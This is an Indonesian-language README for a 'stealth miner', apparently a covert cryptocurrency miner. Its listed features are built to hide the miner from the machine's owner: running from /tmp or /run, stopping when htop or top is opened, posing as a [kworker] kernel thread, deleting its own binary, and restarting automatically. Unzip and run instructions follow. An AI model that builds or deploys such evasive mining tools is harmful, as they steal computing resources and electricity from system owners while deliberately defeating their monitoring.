# Stealth Miner - Versi Aman Tanpa /dev

## Fitur:
- Binary dijalankan dari direktori aman: /tmp atau /run
- Tidak menggunakan /dev (untuk menghindari permission denied)
- Deteksi proses seperti htop/top dan langsung berhenti
- Proses disamarkan menjadi [kworker/...]
- Hapus jejak binary setelah dijalankan
- Auto-restart jika miner keluar

## Cara Jalankan:
1. Ekstrak:
   unzip stealth-miner-advanced-no-dev.zip
   cd stealth-miner

2. Jalankan:
   chmod +x stealth-miner-advanced.sh
   ./stealth-miner-advanced.sh

Log akan dicatat di file .xlog.
